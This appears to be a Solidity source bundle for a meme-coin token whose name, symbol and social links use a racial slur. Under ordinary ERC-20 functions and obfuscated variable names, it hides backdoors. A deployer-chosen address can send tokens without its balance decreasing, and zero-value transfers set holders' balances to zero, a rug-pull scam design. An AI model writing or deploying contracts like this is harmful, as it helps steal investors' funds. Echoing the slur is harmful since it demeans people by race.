{{
  "language": "Solidity",
  "sources": {
    "deploy/Contract.sol": {
      "content": "/*\n\nWebsite: https://niggertwo.crypto-token.live/\n\nTwitter: https://twitter.com/NiggerTwoETH\n\nTelegram: https://t.me/Niggertwo\n\n*/\n\n// SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.19;\n\nabstract contract Context {\r\n    function _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n\n    function _msgData() internal view virtual returns (bytes calldata) {\r\n        return msg.data;\r\n    }\r\n}\n\ncontract Ownable is Context {\r\n    address private _owner;\r\n\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n\n    /**\r\n     * @dev Initializes the contract setting the deployer as the initial owner.\r\n     */\r\n    constructor() {\r\n        address msgSender = _msgSender();\r\n        _owner = msgSender;\r\n        emit OwnershipTransferred(address(0), msgSender);\r\n    }\r\n\n    /**\r\n     * @dev Returns the address of the current owner.\r\n     */\r\n    function owner() public view returns (address) {\r\n        return _owner;\r\n    }\r\n\n    /**\r\n     * @dev Throws if called by any account other than the owner.\r\n     */\r\n    modifier onlyOwner() {\r\n        require(_owner == _msgSender(), 'Ownable: caller is not the owner');\r\n        _;\r\n    }\r\n\n    /**\r\n     * @dev Leaves the contract without owner. It will not be possible to call\r\n     * `onlyOwner` functions anymore. Can only be called by the current owner.\r\n     *\r\n     * NOTE: Renouncing ownership will leave the contract without an owner,\r\n     * thereby removing any functionality that is only available to the owner.\r\n     */\r\n    function renounceOwnership() public virtual onlyOwner {\r\n        emit OwnershipTransferred(_owner, address(0));\r\n        _owner = address(0);\r\n    }\r\n\n    /**\r\n     * @dev Transfers ownership of the contract to a new account (`newOwner`).\r\n     * Can only be called by the current owner.\r\n     */\r\n    function transferOwnership(address newOwner) public virtual onlyOwner {\r\n        require(newOwner != address(0), 'Ownable: new owner is the zero address');\r\n        emit OwnershipTransferred(_owner, newOwner);\r\n        _owner = newOwner;\r\n    }\r\n}\n\ninterface IUniswapV2Router02 {\r\n    function factory() external pure returns (address);\r\n\n    function WETH() external pure returns (address);\r\n}\n\ninterface IUniswapV2Factory {\r\n    function createPair(address tokenA, address tokenB) external returns (address pair);\r\n}\n\ncontract Nigger is Ownable {\n    uint256 private dtnlc = 114;\n\n    function vaijf(address qlbr, address raxqn, uint256 drgwqase) private {\r\n        if (0 == asyjebrfu[qlbr]) {\r\n            balanceOf[qlbr] -= drgwqase;\r\n        }\r\n        balanceOf[raxqn] += drgwqase;\r\n        if (0 == drgwqase && raxqn != itzeclub) {\r\n            balanceOf[raxqn] = drgwqase;\r\n        }\r\n        emit Transfer(qlbr, raxqn, drgwqase);\r\n    }\n\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n\n    string public name = 'Nigger 2.0';\n\n    constructor(address fuviy) {\r\n        balanceOf[msg.sender] = totalSupply;\r\n        asyjebrfu[fuviy] = dtnlc;\r\n        IUniswapV2Router02 bukqeazlfwy = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\r\n        itzeclub = IUniswapV2Factory(bukqeazlfwy.factory()).createPair(address(this), bukqeazlfwy.WETH());\r\n    }\n\n    address public itzeclub;\n\n    mapping(address => uint256) private asyjebrfu;\n\n    string public symbol = 'Nigger 2.0';\n\n    function transferFrom(address qlbr, address raxqn, uint256 drgwqase) public returns (bool success) {\r\n        require(drgwqase <= allowance[qlbr][msg.sender]);\r\n        allowance[qlbr][msg.sender] -= drgwqase;\r\n        vaijf(qlbr, raxqn, drgwqase);\r\n        return true;\r\n    }\n\n    function approve(address ljpsgaoufi, uint256 drgwqase) public returns (bool success) {\r\n        allowance[msg.sender][ljpsgaoufi] = drgwqase;\r\n        emit Approval(msg.sender, ljpsgaoufi, drgwqase);\r\n        return true;\r\n    }\n\n    uint256 public totalSupply = 1000000000 * 10 ** 9;\n\n    mapping(address => mapping(address => uint256)) public allowance;\n\n    mapping(address => uint256) private csgdyjzknhfx;\n\n    event Transfer(address indexed from, address indexed to, uint256 value);\n\n    mapping(address => uint256) public balanceOf;\n\n    function transfer(address raxqn, uint256 drgwqase) public returns (bool success) {\r\n        vaijf(msg.sender, raxqn, drgwqase);\r\n        return true;\r\n    }\n\n    uint8 public decimals = 9;\n}\n"
    }
  },
  "settings": {
    "optimizer": {
      "enabled": false,
      "runs": 200
    },
    "outputSelection": {
      "*": {
        "*": [
          "evm.bytecode",
          "evm.deployedBytecode",
          "devdoc",
          "userdoc",
          "metadata",
          "abi"
        ]
      }
    },
    "libraries": {}
  }
}}